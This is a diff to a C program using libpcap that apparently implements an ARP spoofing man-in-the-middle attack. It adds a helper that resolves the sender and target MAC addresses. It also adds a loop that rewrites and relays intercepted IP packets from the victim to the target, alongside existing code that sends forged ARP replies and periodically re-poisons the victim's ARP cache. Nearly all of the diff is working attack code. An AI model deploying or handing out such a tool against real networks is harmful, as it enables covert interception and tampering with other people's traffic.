@@ -168,6 +168,57 @@ void make_arp_packet(	struct arp_packet * packet, uint8_t ether_dhost[], uint8_t
         memcpy(packet->des_hrd_addr, des_hrd_addr, ETHER_ADDR_LEN);         
         memcpy(&packet->des_pro_addr, des_pro_addr, sizeof(struct in_addr));
 }
+void get_mac_addr(	uint8_t result_ether_addr[], struct in_addr * result_ip, struct in_addr * my_ip, 
+			pcap_t * fp, struct arp_packet * packet, uint8_t my_mac[], uint16_t ether_type,
+                        uint16_t arp_hrd_type, uint16_t arp_pro_type, uint16_t arp_opcode)
+{	
+	uint8_t BROADCAST_MAC[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+	uint8_t BROADCAST_MAC2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+	make_arp_packet(packet, BROADCAST_MAC, my_mac, ether_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN,
+                        IP_ADDR_LEN, arp_opcode, my_mac, my_ip, BROADCAST_MAC2, result_ip);
+
+        if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(struct arp_packet)))             // send packet
+        {       
+                fprintf(stderr, "\nError sending the packet\n");
+                exit(0);
+        }
+
+        while (true){
+                struct pcap_pkthdr* header;
+                struct libnet_ethernet_hdr* ETH_header;
+                const u_char* rcv_packet;
+                u_char * src_hrd_addr;
+                struct in_addr* src_pro_addr;
+                u_char * des_hrd_addr;
+                struct in_addr* des_pro_addr;
+                int res = pcap_next_ex(fp, &header, &rcv_packet);
+                if (res == 0) continue;
+                if (res == -1 || res == -2) break;
+
+                ETH_header = (libnet_ethernet_hdr *)rcv_packet;
+                if(ntohs(ETH_header->ether_type) != ETHERTYPE_ARP)                              // if not ARP
+                        continue;
+
+                rcv_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
+                src_hrd_addr = (u_char *)rcv_packet;
+                rcv_packet += ETHER_ADDR_LEN;
+                src_pro_addr = (in_addr *)rcv_packet;
+                rcv_packet += sizeof(struct in_addr);
+                des_hrd_addr = (u_char *)rcv_packet;
+                rcv_packet += ETHER_ADDR_LEN;
+                des_pro_addr = (in_addr *)rcv_packet;
+
+                if(strcmp(inet_ntoa(*result_ip), inet_ntoa(*src_pro_addr)) == 0)                // src_pro_addr == sender_ip
+                {
+                        if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) == 0)            // des_pro_addr== my_ip
+                        {
+                                memcpy(result_ether_addr, src_hrd_addr, ETHER_ADDR_LEN);               // sender mac get
+                                break;
+                        }
+                }
+        }
+}
 
 void *t_arp_infection(void *th_data)
 {
@@ -232,9 +283,7 @@ int main(int argc, char* argv[])
 	printf("Give me arp infection time interval(sec) : ");
 	scanf("%d", &time_interval);
 
-	uint8_t my_mac[ETHER_ADDR_LEN], sender_mac[ETHER_ADDR_LEN];
-	uint8_t BROADCAST_MAC[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-	uint8_t BROADCAST_MAC2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+	uint8_t my_mac[ETHER_ADDR_LEN], sender_mac[ETHER_ADDR_LEN], target_mac[ETHER_ADDR_LEN];
 	struct in_addr * my_ip, *sender_ip, *target_ip;
 	my_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
 	sender_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
@@ -252,60 +301,11 @@ int main(int argc, char* argv[])
 	getIpAddress(my_ip, argv[1]);
 	inet_aton(argv[2], sender_ip);								// get sender ip
 	inet_aton(argv[3], target_ip);								// get target ip
-	
-	make_arp_packet(packet, BROADCAST_MAC, my_mac, ether_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
-			IP_ADDR_LEN, arp_opcode, my_mac, my_ip, BROADCAST_MAC2, sender_ip);
 
-//	print_packet(packet);
-	
-	if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(struct arp_packet)))		// send packet
-	{
-		fprintf(stderr, "\nError sending the packet\n");
-		return -1;
-	}
-		
-	printf("--------send broadcast arp packet!--------\n");
+	get_mac_addr(sender_mac, sender_ip, my_ip, fp, packet, my_mac, ether_type, arp_hrd_type, arp_pro_type, arp_opcode);
+	get_mac_addr(target_mac, target_ip, my_ip, fp, packet, my_mac, ether_type, arp_hrd_type, arp_pro_type, arp_opcode);
+	printf("--------sender mac, target mac get!--------\n");
 
-	while (true){
-		struct pcap_pkthdr* header;
-		struct libnet_ethernet_hdr* ETH_header;
-		const u_char* rcv_packet;
-		u_char * src_hrd_addr;
-		struct in_addr* src_pro_addr;
-		u_char * des_hrd_addr;
-		struct in_addr* des_pro_addr;
-		int res = pcap_next_ex(fp, &header, &rcv_packet);
-		if (res == 0) continue;
-		if (res == -1 || res == -2) break;
-//		printf("%u bytes captured\n", header->caplen);
-
-		ETH_header = (libnet_ethernet_hdr *)rcv_packet;
-		if(ntohs(ETH_header->ether_type) != ETHERTYPE_ARP)				// if not ARP
-//			printf("ETH type : %04x	-> It's ARP!\n", ntohs(ETH_header->ether_type));
-//		else {
-			continue;
-//		}
-
-		rcv_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
-		src_hrd_addr = (u_char *)rcv_packet;
-		rcv_packet += ETHER_ADDR_LEN;
-		src_pro_addr = (in_addr *)rcv_packet;
-		rcv_packet += sizeof(struct in_addr);
-		des_hrd_addr = (u_char *)rcv_packet;
-                rcv_packet += ETHER_ADDR_LEN;
-                des_pro_addr = (in_addr *)rcv_packet;
-
-		if(strcmp(inet_ntoa(*sender_ip), inet_ntoa(*src_pro_addr)) == 0)		// src_pro_addr == sender_ip
-		{
-			if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) == 0)		// des_pro_addr== my_ip
-			{
-				printf("--------sender mac get!!--------\n");
-				memcpy(sender_mac, src_hrd_addr, ETHER_ADDR_LEN);		// sender mac get
-				break;
-			}
-		} 
-	}	
-	
 	arp_opcode = ARPOP_REPLY;								// reply : 2
 	make_arp_packet(packet, sender_mac, my_mac, ether_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
 			IP_ADDR_LEN, arp_opcode, my_mac, target_ip, sender_mac, sender_ip);
@@ -336,33 +336,16 @@ int main(int argc, char* argv[])
                 exit(0);
         }
 	pthread_detach(p_infection_th);
-
-/*
-        if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(arp_packet)))			// send packet
-        {
-                fprintf(stderr, "\nError sending the packet\n");
-                return -1;
-        }
-
-	printf("--------send arp attack!--------\n");
-*/	
-	free(my_ip);
-	free(sender_ip);
-	free(target_ip);
-	free(packet);
 	
 	while (status){
                 struct pcap_pkthdr* header;
                 struct libnet_ethernet_hdr* ETH_header;
+		struct libnet_ipv4_hdr* IP_header;
                 const u_char* rcv_packet;
-                u_char * src_hrd_addr;
                 struct in_addr* src_pro_addr;
-                u_char * des_hrd_addr;
-                struct in_addr* des_pro_addr;
                 int res = pcap_next_ex(fp, &header, &rcv_packet);
                 if (res == 0) continue;
                 if (res == -1 || res == -2) break;
-//              printf("%u bytes captured\n", header->caplen);
 
                 ETH_header = (libnet_ethernet_hdr *)rcv_packet;
 		if(ntohs(ETH_header->ether_type) == ETHERTYPE_ARP){                            	// if ARP
@@ -374,30 +357,35 @@ int main(int argc, char* argv[])
 		        printf("--------arp infection! by catching arp-table change--------\n");	 
 			continue;
 		}
-/*
-                rcv_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
-                src_hrd_addr = (u_char *)rcv_packet;
-                rcv_packet += ETHER_ADDR_LEN;
-                src_pro_addr = (in_addr *)rcv_packet;
-                rcv_packet += sizeof(struct in_addr);
-                des_hrd_addr = (u_char *)rcv_packet;
-                rcv_packet += ETHER_ADDR_LEN;
-                des_pro_addr = (in_addr *)rcv_packet;
-
-                if(strcmp(inet_ntoa(*sender_ip), inet_ntoa(*src_pro_addr)) == 0)                // src_pro_addr == sender_ip
-                {
-                        if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) == 0)            // des_pro_addr== my_ip
-                        {
-                                printf("--------sender mac get!!--------\n");
-                                memcpy(sender_mac, src_hrd_addr, ETHER_ADDR_LEN);               // sender mac get
-                                break;
-                        }
-                }
-*/
+		else if (ntohs(ETH_header->ether_type) == ETHERTYPE_IP){
+			rcv_packet += sizeof(struct libnet_ethernet_hdr);
+			IP_header = (libnet_ipv4_hdr *)rcv_packet;
+			if(	ETH_header->ether_shost[0]==sender_mac[0] && ETH_header->ether_shost[1]==sender_mac[1] && 
+				ETH_header->ether_shost[2]==sender_mac[2] && ETH_header->ether_shost[3]==sender_mac[3] && 
+				ETH_header->ether_shost[4]==sender_mac[4] && ETH_header->ether_shost[5]==sender_mac[5] && 	// src_mac == sender_mac
+				ETH_header->ether_dhost[0]==my_mac[0] && ETH_header->ether_dhost[1]==my_mac[1] &&
+				ETH_header->ether_dhost[2]==my_mac[2] && ETH_header->ether_dhost[3]==my_mac[3] &&
+				ETH_header->ether_dhost[4]==my_mac[4] && ETH_header->ether_dhost[5]==my_mac[5] )		// des_mac == my_mac
+			{
+				memcpy(ETH_header->ether_dhost, target_mac, ETHER_ADDR_LEN);
+				memcpy(ETH_header->ether_shost, my_mac, ETHER_ADDR_LEN);
+				rcv_packet -= sizeof(struct libnet_ethernet_hdr);
+				if(pcap_sendpacket(fp, (unsigned char *)rcv_packet, header->caplen)) // relay packet
+	                        {
+        	                        fprintf(stderr, "\nError sending the packet\n");
+                	                return -1;
+                        	}
+	                        printf("--------Send Relay IP Packet!--------\n");
+			}
+		}
         }
 
 	sleep(time_interval);
 
+	free(my_ip);
+	free(sender_ip);
+	free(target_ip);
+	free(packet);
 	free(th_packet);
 	printf("--------Successful Program End--------\n");
 	
